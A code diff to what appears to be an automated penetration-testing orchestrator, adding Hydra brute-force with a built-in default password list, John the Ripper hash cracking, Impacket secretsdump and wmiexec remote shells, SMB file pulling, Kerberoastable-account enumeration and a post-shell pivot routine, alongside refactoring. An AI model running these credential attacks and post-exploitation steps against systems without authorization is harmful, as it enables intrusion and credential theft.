-    # Available when at least one analysis tool is present
-    binary_tools = ["checksec", "rabin2", "r2", "ROPgadget", "ltrace"]
+    # Binary analysis — checksec, rabin2, radare2, ROPgadget, ltrace, strace
+    # Available when at least one analysis tool is present (from dynamic discovery)
     binary_available = any(
-        subprocess.run(["which", t], capture_output=True).returncode == 0
-        for t in binary_tools
+        _AVAILABLE_TOOLS.get(t, False)
+        for t in ["checksec", "rabin2", "r2", "radare2", "ROPgadget", "ropgadget",
+                  "ltrace", "strace", "gdb", "objdump"]
     )
 
     # System auditor — filesystem, process, and log integrity via SSH
@@ -1327,7 +1785,7 @@ def detect_instruments() -> dict:
     # Container inspect — runs docker inspect from host, emits CE-* wickets
     # No SSH needed -- works from archbox against any container in scope
     ce_parse_path = SKG_HOME / "skg-container-escape-toolchain" / "adapters" / "container_inspect" / "parse.py"
-    docker_available = subprocess.run(["which","docker"],capture_output=True).returncode == 0
+    docker_available = _AVAILABLE_TOOLS.get("docker", False)
     instruments["container_inspect"] = Instrument(
         name="container_inspect",
         description="Docker inspect — CE-01 root, CE-02 privileged, CE-03 socket, CE-04 API",
@@ -1344,6 +1802,42 @@ def detect_instruments() -> dict:
         wavelength=["BA-01", "BA-02", "BA-03", "BA-04", "BA-05", "BA-06"],
         cost=4.0,
         available=binary_available,
+    )
+
+    # capa capability analysis — SFTP binary + local capa run
+    # Wavelength: BA-07 (capability_identified), BA-08 (attck_technique_confirmed)
+    # Cost: 6.0 — SFTP transfer + capa scan (slower than checksec, faster than Ghidra)
+    _capa_adapter = SKG_HOME / "skg-binary-toolchain" / "adapters" / "capa_analysis" / "parse.py"
+    instruments["capa_analysis"] = Instrument(
+        name="capa_analysis",
+        description="capa capability + ATT&CK technique mapping — BA-07/BA-08",
+        wavelength=["BA-07", "BA-08"],
+        cost=6.0,
+        available=_capa_adapter.exists() and _AVAILABLE_TOOLS.get("capa", False) and _paramiko_ok,
+    )
+
+    # angr symbolic execution — SFTP binary + local angr exploration
+    # Wavelength: BA-09 (symbolic_vuln_path_confirmed)
+    # Cost: 10.0 — angr CFGFast + bounded symbolic exploration; expensive but non-executing
+    _angr_adapter = SKG_HOME / "skg-binary-toolchain" / "adapters" / "angr_symbolic" / "parse.py"
+    instruments["angr_symbolic"] = Instrument(
+        name="angr_symbolic",
+        description="angr symbolic execution — confirms feasible path to dangerous call (BA-09)",
+        wavelength=["BA-09"],
+        cost=10.0,
+        available=_angr_adapter.exists() and _AVAILABLE_TOOLS.get("py:angr", False) and _paramiko_ok,
+    )
+
+    # Frida dynamic instrumentation — hooks dangerous calls at runtime (authorized only)
+    # Wavelength: BA-10 (runtime_hook_confirmed)
+    # Cost: 8.0 — requires frida-server on target OR local frida + SFTP fetch
+    _frida_adapter = SKG_HOME / "skg-binary-toolchain" / "adapters" / "frida_trace" / "parse.py"
+    instruments["frida_trace"] = Instrument(
+        name="frida_trace",
+        description="Frida runtime hook — intercepts dangerous calls during live execution (BA-10)",
+        wavelength=["BA-10"],
+        cost=8.0,
+        available=_frida_adapter.exists() and _AVAILABLE_TOOLS.get("py:frida", False) and _paramiko_ok,
     )
 
     # IoT firmware probe — network-side + offline image analysis
@@ -1393,6 +1887,26 @@ def detect_instruments() -> dict:
         wavelength=["HO-02", "HO-03", "WB-08", "WB-20"],
         cost=1.5,
         available=cred_reuse_path.exists(),
+    )
+
+    # Hydra — active brute-force of SSH/FTP/SMB/HTTP auth services
+    # Complements cred_reuse (which tests known creds) — hydra tests wordlists
+    # and default credential pairs against discovered auth services.
+    instruments["hydra"] = Instrument(
+        name="hydra",
+        description="Hydra brute-force — SSH/FTP/SMB/HTTP login with default and harvested credential lists",
+        wavelength=["HO-02", "HO-03", "WB-08", "WB-19", "DE-04"],
+        cost=4.0,
+        available=_AVAILABLE_TOOLS.get("hydra", False),
+    )
+
+    # John the Ripper — offline hash cracking after hash harvest from enum4linux/ssh/web
+    instruments["john"] = Instrument(
+        name="john",
+        description="John the Ripper — offline hash cracking for harvested NTLM/shadow/web hashes",
+        wavelength=["HO-03", "AD-03", "WB-08"],
+        cost=5.0,
+        available=_AVAILABLE_TOOLS.get("john", False) or _AVAILABLE_TOOLS.get("hashcat", False),
     )
 
     # Structured data fetcher — pulls JSON/JSONL/XML/YAML from web endpoints.
@@ -1479,6 +1993,61 @@ def detect_instruments() -> dict:
         available=True,
     )
 
+    # Impacket post-exploitation — secretsdump, wmiexec (mimikatz equivalent on Linux)
+    # Available when impacket Python package is installed (confirmed via py:impacket check)
+    instruments["impacket_post"] = Instrument(
+        name="impacket_post",
+        description="Impacket post-ex — secretsdump NTLM hashes, wmiexec remote shell (mimikatz equivalent)",
+        wavelength=["HO-03", "HO-17", "AD-15"],
+        cost=5.0,
+        available=_AVAILABLE_TOOLS.get("py:impacket", False),
+    )
+
+    # theHarvester OSINT — domain/subdomain/email enumeration from public sources
+    # Available when binary present OR always (Python fallback via crt.sh CT logs)
+    import shutil as _shutil_di
+    _harvester_avail = (
+        bool(_shutil_di.which("theHarvester") or _shutil_di.which("theharvester"))
+        or True  # crt.sh Python fallback always works
+    )
+    instruments["theharvester"] = Instrument(
+        name="theharvester",
+        description="theHarvester OSINT — subdomains, emails, hosts from crt.sh / public DNS",
+        wavelength=["HO-25", "WB-01", "AD-01"],
+        cost=2.0,
+        available=_harvester_avail,
+    )
+
+    # smbclient share enumeration — lists shares, tests read/write access, pulls
+    # interesting files.  Installed on this system (/usr/bin/smbclient).
+    instruments["smbclient"] = Instrument(
+        name="smbclient",
+        description="smbclient share enumeration — list shares, test access, pull sensitive files",
+        wavelength=["HO-06", "HO-07", "HO-19", "HO-20", "AD-04"],
+        cost=2.5,
+        available=_AVAILABLE_TOOLS.get("smbclient", False),
+    )
+
+    # LDAP enumeration via ldap3 Python library — anonymous bind check, user/group/
+    # computer/GPO enumeration, Kerberoastable SPNs, LAPS attributes.
+    instruments["ldap_enum"] = Instrument(
+        name="ldap_enum",
+        description="LDAP/AD enumeration — anonymous bind, users, groups, Kerberoastable SPNs, LAPS",
+        wavelength=["AD-01", "AD-02", "AD-03", "AD-04", "AD-05", "AD-15", "HO-05"],
+        cost=3.0,
+        available=_AVAILABLE_TOOLS.get("py:ldap3", False),
+    )
+
+    # OpenSSL TLS scanning — weak protocol detection, cert analysis, SAN OSINT.
+    # Always available (openssl installed at /usr/bin/openssl).
+    instruments["openssl_tls"] = Instrument(
+        name="openssl_tls",
+        description="OpenSSL TLS scan — weak ciphers/protocols, self-signed/expired certs, SAN enumeration",
+        wavelength=["WB-05", "WB-06", "WB-07", "HO-25"],
+        cost=1.5,
+        available=_AVAILABLE_TOOLS.get("openssl", False),
+    )
+
     # Register instrument wavelengths with the wicket graph so it can classify
     # hypotheses as observable (instrument exists) vs dark (no instrument).
     _inst_wavelengths = {
@@ -1504,9 +2073,12 @@ def detect_instruments() -> dict:
 
 # ── Field energy computation ─────────────────────────────────────────────
 
-def load_wicket_states(ip: str) -> dict:
+def load_wicket_states(node_key: str) -> dict:
     """
-    Load and kernel-aggregate all wicket observations for a target.
+    Load and kernel-aggregate all wicket observations for a node.
+
+    node_key is the stable identity_key for the node.  For IP-only hosts this
+    equals the IP address.
 
     Replaces last-write-wins with support vector aggregation:
       SupportEngine.aggregate() → CollapseThresholds → StateEngine.collapse()
@@ -1514,7 +2086,7 @@ def load_wicket_states(ip: str) -> dict:
     Returns {wicket_id: {"status": str, "detail": str, "ts": str, "phi_r": float, "phi_b": float, "phi_u": float}}
     Compatible with all existing callers.
     """
-    return _kernel.states_with_detail(ip)
+    return _kernel.states_with_detail(node_key)
 
 
 def _load_events_file(path: str, states: dict, filter_ip: str = None):
@@ -1530,9 +2102,13 @@ def _load_events_file(path: str, states: dict, filter_ip: str = None):
 
                 # Filter by IP if specified
                 if filter_ip:
-                    wid_ip = payload.get("workload_id", "")
-                    target_ip = payload.get("target_ip", "")
-                    if filter_ip not in wid_ip and filter_ip not in target_ip:
+                    aliases = {
+                        str(parse_workload_ref(payload.get("workload_id", "")).get("identity_key") or "").strip(),
+                        str(payload.get("target_ip") or "").strip(),
+                        str(payload.get("workload_id") or "").strip(),
+                    }
+                    aliases.discard("")
+                    if str(filter_ip or "").strip() not in aliases:
                         continue
 
                 wid = payload.get("wicket_id")
@@ -1594,13 +2170,15 @@ def _project_gravity_events(events_file: Path, run_id: str, result: dict) -> Non
 
 def entropy_reduction_potential(
     instrument: "Instrument",
-    target_ip: str,
+    node_key: str,
     states: dict,
     applicable_wickets: set,
     folds=None,
 ) -> float:
     """
-    Compute instrument selection potential via kernel GravityScheduler.
+    Compute instrument selection potential for a node via kernel GravityScheduler.
+
+    node_key is the stable node identity (identity_key), not the operator target label.
 
     Routes through KernelStateEngine.instrument_potential() which uses:
       - SupportEngine for current wicket states
@@ -1611,7 +2189,7 @@ def entropy_reduction_potential(
         return 0.0
 
     # Hard failures (999 sentinel) → excluded
-    history = instrument.entropy_history.get(target_ip, [])
+    history = instrument.entropy_history.get(node_key, [])
     if history and history[-1] >= 500:
         return 0.0
 
@@ -1624,7 +2202,7 @@ def entropy_reduction_potential(
         instrument_name=instrument.name,
         instrument_wavelength=instrument.wavelength,
         instrument_cost=instrument.cost,
-        target_ip=target_ip,
+        node_key=node_key,
         applicable_wickets=applicable_wickets,
         folds=folds,
         failure_penalty=failure_penalty,
@@ -1679,14 +2257,17 @@ def execute_instrument(instrument: Instrument, target: dict,
                        current_states: dict = None,
                        authorized: bool = False) -> dict:
     """
-    Execute an instrument against a target.
+    Execute an instrument against a node.
     current_states: wicket states at time of selection (for MSF RC branching)
     Returns dict with results and entropy change.
     """
+    # node_key = stable node identity (scheduling primitive).
+    # ip = routable address (used for network instrument execution).
+    node_key = str(target.get("identity_key") or target["ip"]).strip()
     ip = target["ip"]
     result = {
         "instrument": instrument.name,
-        "target": ip,
+        "target": node_key,
         "events_before": 0,
         "events_after": 0,
         "new_findings": [],
@@ -1694,11 +2275,21 @@ def execute_instrument(instrument: Instrument, target: dict,
     }
 
     # Count field state before
-    states_before = load_wicket_states(ip)
+    states_before = load_wicket_states(node_key)
     unknown_before = sum(1 for s in states_before.values() if s.get("status") == "unknown")
     unresolved_before = sum(float(s.get("local_energy", 0.0) or s.get("phi_u", 0.0) or 0.0) for s in states_before.values())
 
-    if instrument.name == "http_collector":
+    # ── Plugin adapter registry ────────────────────────────────────────────
+    # New instruments (impacket_post, theharvester, etc.) are dispatched here.
+    # The adapter registry decouples tool execution from the physics engine.
+    if instrument.name in _GRAVITY_ADAPTERS:
+        result = _GRAVITY_ADAPTERS[instrument.name](
+            ip, target, run_id, out_dir, result,
+            authorized=authorized,
+            node_key=node_key,
+        )
+
+    elif instrument.name == "http_collector":
         result = _exec_http_collector(ip, target, run_id, out_dir, result)
 
     elif instrument.name == "auth_scanner":
@@ -1752,8 +2343,20 @@ def execute_instrument(instrument: Instrument, target: dict,
         result = _exec_container_inspect(ip, target, run_id, out_dir, result)
     elif instrument.name == "binary_analysis":
         result = _exec_binary_analysis(ip, target, run_id, out_dir, result)
+    elif instrument.name == "capa_analysis":
+        result = _exec_capa_analysis(ip, target, run_id, out_dir, result)
+    elif instrument.name == "angr_symbolic":
+        result = _exec_angr_symbolic(ip, target, run_id, out_dir, result)
+    elif instrument.name == "frida_trace":
+        result = _exec_frida_trace(ip, target, run_id, out_dir, result, authorized=authorized)
     elif instrument.name == "cred_reuse":
         result = _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=authorized)
+
+    elif instrument.name == "hydra":
+        result = _exec_hydra(ip, target, run_id, out_dir, result, authorized=authorized)
+
+    elif instrument.name == "john":
+        result = _exec_john(ip, target, run_id, out_dir, result)
 
     elif instrument.name == "gobuster":
         result = _exec_gobuster(ip, target, run_id, out_dir, result)
@@ -1789,15 +2392,15 @@ def execute_instrument(instrument: Instrument, target: dict,
         result = _exec_db_discovery(ip, target, run_id, out_dir, result)
 
     # Count field state after
-    states_after = load_wicket_states(ip)
+    states_after = load_wicket_states(node_key)
     unknown_after = sum(1 for s in states_after.values() if s.get("status") == "unknown")
     unresolved_after = sum(float(s.get("local_energy", 0.0) or s.get("phi_u", 0.0) or 0.0) for s in states_after.values())
     result["unknowns_resolved"] = unknown_before - unknown_after
     result["unresolved_energy_reduced"] = round(unresolved_before - unresolved_after, 6)
 
-    # Track entropy history for this instrument
-    instrument.entropy_history.setdefault(ip, []).append(unresolved_after)
-    instrument.last_used_on[ip] = iso_now()
+    # Track entropy history for this instrument — keyed by node_key (stable identity)
+    instrument.entropy_history.setdefault(node_key, []).append(unresolved_after)
+    instrument.last_used_on[node_key] = iso_now()
 
     return result
 
@@ -1919,7 +2522,9 @@ def _exec_ai_probe(ip, target, run_id, out_dir, result):
             attack_path_id="ai_llm_extract_v1",
             out_path=str(events_file),
         )
-        all_events.extend(service_events or [])
+        # service_events are summary dicts, not event envelopes — do not add to
+        # all_events or they will overwrite the real events probe_device already
+        # wrote to events_file (MED-45 fix).
         realized_ai = [e["wicket_id"] for e in (service_events or []) if e.get("status") == "realized"]
         if realized_ai:
             print(f"    [AI-PROBE] {ip}: AI services found — {realized_ai[:5]}")
@@ -1986,29 +2591,23 @@ def _exec_ai_probe(ip, target, run_id, out_dir, result):
                 print(f"    [AI-ANALYST] {ip}: LLM analysis complete")
                 print(f"      {analysis[:300].replace(chr(10), ' ')}")
                 # Emit as metacognition wicket
-                mc_ev = {
-                    "id": str(uuid.uuid4()), "ts": now_ts,
-                    "type": "obs.attack.precondition",
-                    "source": {"source_id": "ai_analyst", "toolchain": "skg-ai-toolchain", "version": "0"},
-                    "payload": {
-                        "wicket_id": "MC-01",
-                        "status": "realized",
-                        "workload_id": f"ai_analyst::{ip}",
-                        "target_ip": ip,
-                        "detail": analysis[:500],
-                        "run_id": run_id,
-                    },
-                    "provenance": {
-                        "evidence_rank": 3,
-                        "evidence": {
-                            "source_kind": "llm_analysis",
-                            "pointer": f"ai_analyst://{ip}",
-                            "collected_at": now_ts,
-                            "confidence": 0.70,
-                        },
-                    },
-                }
-                all_events.append({"wicket_id": "MC-01", "status": "realized", "detail": analysis})
+                mc_ev = _gravity_precondition_event(
+                    source_id="ai_analyst",
+                    toolchain="skg-ai-toolchain",
+                    wicket_id="MC-01",
+                    status="realized",
+                    workload_id=f"ai_analyst::{ip}",
+                    target_ip=ip,
+                    detail=analysis[:500],
+                    evidence_rank=3,
+                    source_kind="llm_analysis",
+                    pointer=f"ai_analyst://{ip}",
+                    confidence=0.70,
+                    run_id=run_id,
+                    version="0",
+                    ts=now_ts,
+                )
+                all_events.append(mc_ev)
                 # Write the MC event to a separate file for the analyst panel
                 mc_file = out_dir / f"gravity_analyst_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
                 with open(mc_file, "w") as fh:
@@ -2016,13 +2615,22 @@ def _exec_ai_probe(ip, target, run_id, out_dir, result):
         except Exception as exc:
             log.debug(f"[AI-ANALYST] LLM analysis failed for {ip}: {exc}")
 
-    # Write all events
-    with open(events_file, "w") as fh:
-        for ev in all_events:
-            fh.write(json.dumps(ev) + "\n")
+    # Append any additional envelope-shaped events (e.g. MC-01 from LLM analyst)
+    # to whatever probe_device already wrote to events_file.  Use "a" not "w"
+    # so the real adapter-authored events are preserved (MED-45 fix).
+    if all_events:
+        with open(events_file, "a") as fh:
+            for ev in all_events:
+                fh.write(json.dumps(ev) + "\n")
+    elif not events_file.exists():
+        events_file.touch()
 
+    total_events = (
+        sum(1 for ln in events_file.read_text().splitlines() if ln.strip())
+        if events_file.exists() else 0
+    )
     result["success"] = True
-    result["events"]  = len(all_events)
+    result["events"]  = total_events
     result["events_file"] = str(events_file)
 
     try:
@@ -2057,19 +2665,30 @@ def _exec_post_exploitation(ip, target, run_id, out_dir, result, session_id=None
     events_file = out_dir / f"gravity_postexp_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
     workload_id = f"host::{ip}"
 
+    # Initialize session state before any branch references it (MED-46 fix)
+    has_msf_session: bool = False
+    active_sessions: dict = {}
+
     def make_event(wicket_id, status, confidence, detail):
-        return json.dumps({
-            "id": str(_uuid.uuid4()), "ts": now,
-            "type": "obs.attack.precondition",
-            "source": {"source_id": "adapter.post_exploitation", "toolchain": "skg-host-toolchain"},
-            "payload": {"wicket_id": wicket_id, "status": status,
-                       "workload_id": workload_id, "target_ip": ip,
-                       "attack_path_id": "host_linux_privesc_sudo_v1",
-                       "run_id": run_id, "detail": detail},
-            "provenance": {"evidence_rank": 1,
-                          "evidence": {"source_kind": "runtime", "pointer": ip,
-                                       "collected_at": now, "confidence": confidence}}
-        }) + "\n"
+        return json.dumps(
+            _gravity_precondition_event(
+                source_id="adapter.post_exploitation",
+                toolchain="skg-host-toolchain",
+                wicket_id=wicket_id,
+                status=status,
+                workload_id=workload_id,
+                target_ip=ip,
+                detail=detail,
+                evidence_rank=1,
+                source_kind="runtime",
+                pointer=ip,
+                confidence=confidence,
+                run_id=run_id,
+                attack_path_id="host_linux_privesc_sudo_v1",
+                version="0",
+                ts=now,
+            )
+        ) + "\n"
 
     # Determine target OS from session metadata or target config
     target_os = (target.get("os") or target.get("kind") or "").lower()
@@ -2138,8 +2757,6 @@ exit
 
     # Check for active MSF sessions using pymetasploit3 RPC (same process space).
     # Subprocess msfconsole would open a separate process with independent sessions.
-    has_msf_session = False
-    active_sessions: dict = {}
     try:
         from pymetasploit3.msfrpc import MsfRpcClient as _MsfRpcClient
         import os as _os
@@ -2306,6 +2923,7 @@ exit
 
 def _exec_http_collector(ip, target, run_id, out_dir, result):
     """Run the web collector."""
+    from urllib.parse import urlparse as _urlparse
     web_ports = target.get("web_ports", [])
     if not web_ports:
         # Infer from services
@@ -2314,37 +2932,69 @@ def _exec_http_collector(ip, target, run_id, out_dir, result):
                 scheme = "https" if "https" in svc["service"] else "http"
                 web_ports.append((svc["port"], scheme))
 
+    # If ip is already a URL, extract port/scheme from it
+    if not web_ports and ip.startswith(("http://", "https://")):
+        try:
+            _parsed = _urlparse(ip)
+            _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
+            web_ports.append((_port, _parsed.scheme))
+        except Exception:
+            pass
+
+    if not web_ports:
+        result["error"] = "No web service discovered on target yet — run nmap first"
+        result["success"] = False
+        return result
+
     for port, scheme in web_ports[:2]:
-        url = f"{scheme}://{ip}:{port}"
+        _host = _strip_url_scheme(ip)
+        if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
+            url = f"{scheme}://{_host}"
+        else:
+            url = f"{scheme}://{_host}:{port}"
         events_file = out_dir / f"gravity_http_{ip}_{port}.ndjson"
         try:
-            from collector import collect
-            collect(target=url, out_path=str(events_file),
-                    attack_path_id="web_sqli_to_shell_v1",
-                    run_id=run_id, workload_id=f"web::{ip}",
-                    timeout=8.0)
-            # Stamp target_ip into every event for cross-file filtering
-            if events_file.exists():
-                lines = events_file.read_text().splitlines()
-                stamped = []
-                for line in lines:
-                    if not line.strip():
-                        continue
-                    try:
-                        ev = json.loads(line)
-                        ev.setdefault("payload", {})["target_ip"] = ip
-                        stamped.append(json.dumps(ev))
-                    except Exception:
-                        stamped.append(line)
-                content = "\n".join(stamped) + "\n"
-                events_file.write_text(content)
-                # Mirror to EVENTS_DIR so FoldDetector and daemon sensor loop
-                # can also read these observations
-                EVENTS_DIR.mkdir(parents=True, exist_ok=True)
-                mirror = EVENTS_DIR / events_file.name
-                mirror.write_text(content)
-                _project_gravity_events(events_file, run_id, result)
+            from skg_services.gravity.web_runtime import collect_surface_events_to_file
 
+            events = collect_surface_events_to_file(
+                url,
+                out_path=events_file,
+                attack_path_id="web_sqli_to_shell_v1",
+                run_id=run_id,
+                workload_id=f"web::{ip}",
+                timeout=8.0,
+            )
+
+            # Stamp target_ip into every event for cross-file filtering.
+            for ev in events:
+                if not isinstance(ev, dict):
+                    continue
+                payload = ev.get("payload")
+                if not isinstance(payload, dict):
+                    payload = {}
+                    ev["payload"] = payload
+                payload["target_ip"] = ip
+
+            content = ""
+            if events:
+                content = "\n".join(json.dumps(ev) for ev in events) + "\n"
+            events_file.write_text(content, encoding="utf-8")
+
+            # Mirror to EVENTS_DIR so FoldDetector and daemon sensor loop can also read these observations.
+            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+            mirror = EVENTS_DIR / events_file.name
+            mirror.write_text(content, encoding="utf-8")
+
+            if events:
+                _project_gravity_events(events_file, run_id, result)
+                realized = sum(
+                    1
+                    for ev in events
+                    if (ev.get("payload", {}) or {}).get("status") == "realized"
+                )
+                result["unknowns_resolved"] = int(result.get("unknowns_resolved", 0)) + realized
+
+            result["events_file"] = str(events_file)
             result["success"] = True
         except Exception as e:
             result["error"] = str(e)
@@ -2353,12 +3003,27 @@ def _exec_http_collector(ip, target, run_id, out_dir, result):
 
 
 def _exec_auth_scanner(ip, target, run_id, out_dir, result):
-    """Run the authenticated scanner."""
+    """Run authenticated web runtime through canonical service wrappers."""
+    from urllib.parse import urlparse as _urlparse
     web_ports = []
     for svc in target.get("services", []):
         if svc["service"] in ("http", "https", "http-alt", "https-alt"):
             scheme = "https" if "https" in svc["service"] else "http"
             web_ports.append((svc["port"], scheme))
+
+    # If ip is already a URL, extract port/scheme from it
+    if not web_ports and ip.startswith(("http://", "https://")):
+        try:
+            _parsed = _urlparse(ip)
+            _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
+            web_ports.append((_port, _parsed.scheme))
+        except Exception:
+            pass
+
+    if not web_ports:
+        result["error"] = "No web service discovered on target yet — run nmap first"
+        result["success"] = False
+        return result
 
     # Load per-target web credentials from targets.yaml
     username = None
@@ -2378,35 +3043,55 @@ def _exec_auth_scanner(ip, target, run_id, out_dir, result):
             pass
 
     for port, scheme in web_ports[:1]:
-        url = f"{scheme}://{ip}:{port}"
+        host = _strip_url_scheme(ip)
+        if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
+            url = f"{scheme}://{host}"
+        else:
+            url = f"{scheme}://{host}:{port}"
         events_file = out_dir / f"gravity_auth_{ip}_{port}.ndjson"
         try:
-            from auth_scanner import auth_scan
-            auth_scan(target=url, out_path=str(events_file),
-                      attack_path_id="web_sqli_to_shell_v1",
-                      try_defaults=True, run_id=run_id,
-                      workload_id=f"web::{ip}",
-                      username=username,
-                      password=password,
-                      timeout=10.0)
-            if events_file.exists():
-                lines = events_file.read_text().splitlines()
-                stamped = []
-                for line in lines:
-                    if not line.strip():
-                        continue
-                    try:
-                        ev = json.loads(line)
-                        ev.setdefault("payload", {})["target_ip"] = ip
-                        stamped.append(json.dumps(ev))
-                    except Exception:
-                        stamped.append(line)
-                content = "\n".join(stamped) + "\n"
-                events_file.write_text(content)
-                EVENTS_DIR.mkdir(parents=True, exist_ok=True)
-                mirror = EVENTS_DIR / events_file.name
-                mirror.write_text(content)
+            from skg_services.gravity.web_runtime import collect_auth_surface_events_to_file
+
+            events = collect_auth_surface_events_to_file(
+                url,
+                out_path=events_file,
+                attack_path_id="web_sqli_to_shell_v1",
+                run_id=run_id,
+                workload_id=f"web::{ip}",
+                username=str(username or ""),
+                password=str(password or ""),
+                try_defaults=True,
+                timeout=10.0,
+            )
+
+            for ev in events:
+                if not isinstance(ev, dict):
+                    continue
+                payload = ev.get("payload")
+                if not isinstance(payload, dict):
+                    payload = {}
+                    ev["payload"] = payload
+                payload["target_ip"] = ip
+
+            content = ""
+            if events:
+                content = "\n".join(json.dumps(ev) for ev in events) + "\n"
+            events_file.write_text(content, encoding="utf-8")
+
+            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
+            mirror = EVENTS_DIR / events_file.name
+            mirror.write_text(content, encoding="utf-8")
+
+            if events:
                 _project_gravity_events(events_file, run_id, result)
+                realized_count = sum(
+                    1
+                    for ev in events
+                    if (ev.get("payload", {}) or {}).get("status") == "realized"
+                )
+                result["unknowns_resolved"] = int(result.get("unknowns_resolved", 0)) + realized_count
+
+            result["events_file"] = str(events_file)
             result["success"] = True
 
             # Auto-generate exploit proposals when high-value findings confirmed
@@ -2741,16 +3426,95 @@ def _exec_web_struct_fetch(ip, target, run_id, out_dir, result):
     return result
 
 
-def _find_web_port_for_target(target: dict) -> int:
-    """Extract web port from target dict (as used in execute_instrument)."""
+def _try_instrument_pivot(node_key: str, ip: str, target_row: dict,
+                           failed_result: dict, instruments: dict,
+                           run_id: str, out_dir: Path) -> None:
+    """
+    Pivot logic: when an instrument fails, try alternative approaches.
+
+    - SSH auth failure -> check credential store for password spray
+    - HTTP 401/403 -> try different auth methods
+    - SMB access denied -> try null session or alternate credentials
+    - Shell gained -> trigger internal network discovery
+    """
+    error = str(failed_result.get("error", "")).lower()
+    instrument = str(failed_result.get("instrument", ""))
+
+    # SSH auth failure -> try credential store
+    if instrument == "ssh_sensor" and ("auth" in error or "authentication" in error):
+        try:
+            import sys as _sys
+            _sys.path.insert(0, str(Path(__file__).parent))
+            from cred_reuse import CredentialStore
+            store = CredentialStore()
+            creds = store.for_target(ip)
+            if creds:
+                print(f"    \u2194 PIVOT: SSH auth failed, trying {len(creds)} stored credentials")
+                # cred_reuse instrument will pick these up on next cycle
+                if _state_db is not None:
+                    for c in creds[:5]:
+                        _state_db.add_credential(
+                            node_key, "ssh",
+                            port=22,
+                            username=c.get("user", ""),
+                            secret=c.get("secret", ""),
+                            source="credential_reuse_pivot",
+                        )
+        except Exception:
+            pass
+
+    # Post-exploit: if shell was gained, trigger internal network discovery
+    if failed_result.get("session_id") or failed_result.get("got_shell"):
+        print(f"    \u2194 PIVOT: Shell on {node_key} -- scheduling internal network discovery")
+        # Mark target for internal scan on next cycle
+        if _state_db is not None:
+            _state_db.add_pivot_target(node_key, ip, method="post_exploit_shell")
+
+
+def _find_web_port_for_target(target: dict) -> int | None:
+    """
+    Extract web port from target dict.
+
+    Returns None when no web service has been discovered yet — callers must
+    check for None and skip execution rather than assuming port 80.
+    Assuming port 80 is open creates false observations on non-web targets.
+    """
     services = target.get("target", {}).get("services", []) or target.get("services", []) or []
     for svc in services:
-        if svc.get("service") in ("http", "https", "http-alt", "https-alt"):
+        if svc.get("service") in ("http", "https", "http-alt", "https-alt", "http-proxy"):
             try:
                 return int(svc["port"])
             except Exception:
                 pass
-    return 80
+    # Also accept any port that looks like a web port by number
+    web_ports = {80, 443, 8080, 8443, 8000, 8008, 8009, 8888}
+    for svc in services:
+        try:
+            if int(svc.get("port", 0)) in web_ports:
+                return int(svc["port"])
+        except Exception:
+            pass
+    return None  # No web service discovered; do not assume
+
+
+def _web_port_from_ip_or_target(ip: str, target: dict) -> int | None:
+    """
+    Determine the web port to use for web instruments (gobuster, nikto, etc.).
+
+    Checks in order:
+    1. If ip is a URL (http:// or https://), extract port from it directly.
+    2. Fall back to _find_web_port_for_target(target) which inspects services.
+    """
+    from urllib.parse import urlparse as _urlparse
+    if ip.startswith(("http://", "https://")):
+        try:
+            parsed = _urlparse(ip)
+            if parsed.port:
+                return parsed.port
+            return 443 if parsed.scheme == "https" else 80
+        except Exception:
+            pass
+    return _find_web_port_for_target(target)
 
 
 def _ingest_events_to_kernel(events: list[dict], target_ip: str) -> None:
@@ -2764,23 +3528,284 @@ def _ingest_events_to_kernel(events: list[dict], target_ip: str) -> None:
         log.debug(f"[ingest] {target_ip}: {exc}")
 
 
+def _exec_hydra(ip: str, target: dict, run_id: str, out_dir: Path, result: dict,
+                authorized: bool = False) -> dict:
+    """
+    Execute hydra credential brute-force against discovered auth services.
+
+    Strategy:
+    - Prioritises harvested credentials from CredentialStore (from prior enum4linux/ssh runs)
+    - Supplements with a small default credential list (common defaults, not rockyou)
+    - Targets SSH, FTP, SMB, and HTTP basic/form auth in order of discovery
+    - Stops after the first valid credential pair per service (hydra -f)
+    - Stores found credentials back into CredentialStore for cred_reuse to propagate
+    """
+    import re as _re
+    import subprocess as _sp
+    import sys as _sys
+
+    services = target.get("target", {}).get("services", []) or []
+
+    def _port_for(*names_or_ports):
+        for s in services:
+            p = s.get("port", 0)
+            n = str(s.get("service", "")).lower()
+            for v in names_or_ports:
+                if isinstance(v, int) and p == v:
+                    return p
+                if isinstance(v, str) and v in n:
+                    return p
+        return None
+
+    ssh_port = _port_for(22, "ssh")
+    ftp_port = _port_for(21, "ftp")
+    smb_port = _port_for(445, 139, "smb")
+    web_port = _find_web_port_for_target(target)
+
+    if not any([ssh_port, ftp_port, smb_port, web_port]):
+        result["error"] = "No auth services discovered yet — run nmap first"
+        result["success"] = False
+        return result
+
+    # Harvest existing credentials from store
+    harvested_users: list[str] = []
+    harvested_passes: list[str] = []
+    try:
+        _sys.path.insert(0, str(Path(__file__).parent))
+        from cred_reuse import CredentialStore as _CS
+        _cs = _CS()
+        for cred in (_cs.for_target(ip) or []):
+            u = cred.get("user", "")
+            s = cred.get("secret", "")
+            if u and u not in harvested_users:
+                harvested_users.append(u)
+            if s and s not in harvested_passes:
+                harvested_passes.append(s)
+    except Exception:
+        pass
+
+    # Default credential pairs — common defaults only, not a wordlist
+    default_users = ["admin", "root", "user", "administrator", "test", "guest",
+                     "ubuntu", "pi", "oracle", "postgres", "vagrant", "anonymous"]
+    default_passes = ["admin", "password", "123456", "root", "admin123", "letmein",
+                      "toor", "changeme", "welcome", "pass", "test", "guest",
+                      "qwerty", "abc123", "raspberry", "ubuntu", "password1",
+                      "default", "12345", "", "admin@123", "P@ssw0rd"]
+
+    # Merge: harvested first (more likely to succeed)
+    user_list = harvested_users + [u for u in default_users if u not in harvested_users]
+    pass_list = harvested_passes + [p for p in default_passes if p not in harvested_passes]
+
+    user_file = out_dir / f"hydra_users_{run_id[:8]}.txt"
+    pass_file = out_dir / f"hydra_passes_{run_id[:8]}.txt"
+    user_file.write_text("\n".join(user_list[:30]))
+    pass_file.write_text("\n".join(pass_list[:40]))
+
